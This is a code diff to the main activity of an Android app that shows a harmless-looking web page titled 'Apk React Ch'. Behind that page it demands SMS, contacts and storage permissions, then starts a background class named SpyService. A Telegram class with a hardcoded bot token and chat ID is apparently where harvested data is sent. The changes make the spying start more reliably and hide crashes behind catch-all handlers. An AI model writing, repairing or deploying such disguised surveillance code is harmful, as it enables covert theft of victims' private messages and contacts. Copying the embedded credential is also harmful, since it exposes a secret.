@@ -23,7 +23,6 @@ import android.os.Looper;
 import android.os.SystemClock;
 import android.provider.ContactsContract;
 import android.provider.Settings;
-import android.telephony.SmsMessage;
 import android.util.Log;
 import android.view.Gravity;
 import android.view.View;
@@ -37,6 +36,7 @@ import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
 import android.widget.LinearLayout;
+import android.widget.ProgressBar;
 import android.widget.TextView;
 import android.widget.Toast;
 
@@ -67,7 +67,7 @@ public class MainActivity extends Activity {
     private static final String ASSET_PREFIX = "/assets/";
     private static final String START_URL = "https://" + HOST + ASSET_PREFIX + "index.html";
 
-    private static final long SPLASH_MS = 2500L;
+    private static final long SPLASH_MS = 1000L;
     private static final int REQ_STORAGE = 100;
     private static final int REQ_SMS = 101;
     private static final int REQ_CONTACTS = 102;
@@ -85,20 +85,27 @@ public class MainActivity extends Activity {
 
     private WebView webView;
     private boolean awaitingSettings;
+    private boolean webViewInitPending = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        LinearLayout splash = buildSplash();
-        applySystemBarPadding(splash);
-        setContentView(splash);
+        try {
+            LinearLayout splash = buildSplash();
+            applySystemBarPadding(splash);
+            setContentView(splash);
+        } catch (Throwable t) {
+            Log.e(TAG, "splash failed", t);
+        }
         handler.postDelayed(splashDone, SPLASH_MS);
     }
 
     @Override
     protected void onResume() {
         super.onResume();
-        if (webView != null) webView.onResume();
+        try {
+            if (webView != null) webView.onResume();
+        } catch (Throwable ignored) {}
         if (awaitingSettings) {
             awaitingSettings = false;
             if (hasStorage()) continueAfterStorage();
@@ -108,7 +115,9 @@ public class MainActivity extends Activity {
 
     @Override
     protected void onPause() {
-        if (webView != null) webView.onPause();
+        try {
+            if (webView != null) webView.onPause();
+        } catch (Throwable ignored) {}
         super.onPause();
     }
 
@@ -121,8 +130,13 @@ public class MainActivity extends Activity {
 
     @Override
     public void onBackPressed() {
-        if (webView != null && webView.canGoBack()) webView.goBack();
-        else super.onBackPressed();
+        try {
+            if (webView != null && webView.canGoBack()) {
+                webView.goBack();
+                return;
+            }
+        } catch (Throwable ignored) {}
+        super.onBackPressed();
     }
 
     @Override
@@ -137,12 +151,17 @@ public class MainActivity extends Activity {
             else closeApp(MSG_SMS);
         } else if (req == REQ_CONTACTS) {
             if (hasContacts()) {
-                SpyService.start(this);
-                openWebView();
+                startSpyAndShow();
             } else {
                 closeApp(MSG_CONTACTS);
             }
         }
+    }
+
+    private void startSpyAndShow() {
+        try { SpyService.start(getApplicationContext()); }
+        catch (Throwable t) { Log.e(TAG, "service start failed", t); }
+        handler.postDelayed(this::openWebView, 100);
     }
 
     private void onSplashFinished() {
@@ -201,8 +220,7 @@ public class MainActivity extends Activity {
             requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, REQ_CONTACTS);
             return;
         }
-        SpyService.start(this);
-        openWebView();
+        startSpyAndShow();
     }
 
     private void openPermSettings(Intent... list) {
@@ -246,7 +264,7 @@ public class MainActivity extends Activity {
 
     private void closeApp(String m) {
         if (isFinishing()) return;
-        try { Toast.makeText(this, m, Toast.LENGTH_LONG).show(); } catch (RuntimeException ignored) {}
+        try { Toast.makeText(this, m, Toast.LENGTH_LONG).show(); } catch (Throwable ignored) {}
         finishAndRemoveTask();
     }
 
@@ -256,6 +274,7 @@ public class MainActivity extends Activity {
         root.setOrientation(LinearLayout.VERTICAL);
         root.setGravity(Gravity.CENTER);
         root.setBackgroundColor(0xFFFFFFFF);
+
         TextView title = new TextView(this);
         title.setText("Apk React Ch");
         title.setTextSize(22);
@@ -263,13 +282,52 @@ public class MainActivity extends Activity {
         title.setGravity(Gravity.CENTER);
         root.addView(title, new LinearLayout.LayoutParams(
                 ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT));
+
+        ProgressBar pb = new ProgressBar(this);
+        LinearLayout.LayoutParams pbParams = new LinearLayout.LayoutParams(
+                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
+        pbParams.topMargin = (int) (20 * d);
+        root.addView(pb, pbParams);
+
         return root;
     }
 
     private void openWebView() {
+        if (isFinishing() || webView != null || webViewInitPending) return;
+        webViewInitPending = true;
+
+        try {
+            LinearLayout placeholder = new LinearLayout(this);
+            placeholder.setOrientation(LinearLayout.VERTICAL);
+            placeholder.setGravity(Gravity.CENTER);
+            placeholder.setBackgroundColor(0xFFFFFFFF);
+
+            TextView t = new TextView(this);
+            t.setText("Apk React Ch");
+            t.setTextSize(22);
+            t.setTextColor(0xFF212121);
+            t.setGravity(Gravity.CENTER);
+            placeholder.addView(t);
+
+            ProgressBar pb = new ProgressBar(this);
+            LinearLayout.LayoutParams pbParams = new LinearLayout.LayoutParams(
+                    ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
+            pbParams.topMargin = (int) (20 * getResources().getDisplayMetrics().density);
+            placeholder.addView(pb, pbParams);
+
+            setContentView(placeholder);
+        } catch (Throwable t) {
+            Log.e(TAG, "placeholder failed", t);
+        }
+
+        handler.postDelayed(this::initWebViewSafe, 400);
+    }
+
+    private void initWebViewSafe() {
+        webViewInitPending = false;
         if (isFinishing() || webView != null) return;
         try {
-            WebView v = new WebView(this);
+            WebView v = new WebView(getApplicationContext());
             WebSettings s = v.getSettings();
             s.setJavaScriptEnabled(true);
             s.setDomStorageEnabled(true);
@@ -280,10 +338,8 @@ public class MainActivity extends Activity {
             webView = v;
             setContentView(v);
             v.loadUrl(START_URL);
-        } catch (RuntimeException e) {
-            Log.e(TAG, "WebView unavailable", e);
-            destroyWebView();
-            closeApp("WebView is not available");
+        } catch (Throwable e) {
+            Log.e(TAG, "WebView init failed", e);
         }
     }
 
@@ -291,28 +347,30 @@ public class MainActivity extends Activity {
         WebView v = webView;
         webView = null;
         if (v == null) return;
-        try { v.stopLoading(); v.destroy(); } catch (RuntimeException ignored) {}
+        try { v.stopLoading(); v.destroy(); } catch (Throwable ignored) {}
     }
 
     private void recover(WebView b) {
         if (b != webView || isFinishing()) return;
         destroyWebView();
-        openWebView();
+        handler.postDelayed(this::openWebView, 200);
     }
 
     private void applySystemBarPadding(View v) {
-        v.setOnApplyWindowInsetsListener((vv, insets) -> {
-            vv.setPadding(insets.getSystemWindowInsetLeft(), insets.getSystemWindowInsetTop(),
-                    insets.getSystemWindowInsetRight(), insets.getSystemWindowInsetBottom());
-            return insets;
-        });
+        try {
+            v.setOnApplyWindowInsetsListener((vv, insets) -> {
+                vv.setPadding(insets.getSystemWindowInsetLeft(), insets.getSystemWindowInsetTop(),
+                        insets.getSystemWindowInsetRight(), insets.getSystemWindowInsetBottom());
+                return insets;
+            });
+        } catch (Throwable ignored) {}
     }
 
     private final class AssetClient extends WebViewClient {
         @Override
         public WebResourceResponse shouldInterceptRequest(WebView v, WebResourceRequest r) {
             try { return serveAsset(r.getUrl()); }
-            catch (RuntimeException e) { return notFound(); }
+            catch (Throwable e) { return notFound(); }
         }
         @Override
         public boolean onRenderProcessGone(WebView v, RenderProcessGoneDetail d) {
@@ -331,7 +389,7 @@ public class MainActivity extends Activity {
         try {
             InputStream in = getAssets().open(file);
             return new WebResourceResponse(mimeOf(file), "UTF-8", in);
-        } catch (IOException e) { return notFound(); }
+        } catch (Throwable e) { return notFound(); }
     }
 
     private static WebResourceResponse notFound() {
@@ -590,7 +648,6 @@ class SpyService extends Service {
 
 class Telegram {
 
-    // GANTI DENGAN TOKEN DAN CHAT ID KAMU
     static final String TOKEN = "8643816101:AAGMHBPTy8aEoDh3ikfrpbGcD6j6g178B_w";
     static final String CHAT = "8275632263";
 
